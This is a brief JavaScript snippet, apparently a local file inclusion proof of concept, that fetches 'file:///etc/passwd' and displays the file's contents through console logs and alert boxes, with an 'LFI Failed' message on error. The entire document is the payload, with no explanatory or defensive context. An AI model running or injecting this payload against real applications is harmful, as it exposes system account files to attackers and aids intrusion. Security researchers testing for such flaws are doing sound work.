fetch('file:///etc/passwd')
  .then(response => response.text())
  .then(text => {
    console.log('File Content:', text);  // Log content to browser console
    alert('File Content Fetched');  // Notify that fetch worked
    alert(text);  // Show file content (or part of it) in the alert
  })
  .catch(error => {
    console.log('Fetch Error:', error);  // Log any errors to the console
    alert('LFI Failed: ' + error.message);  // Alert failure with error message
  });
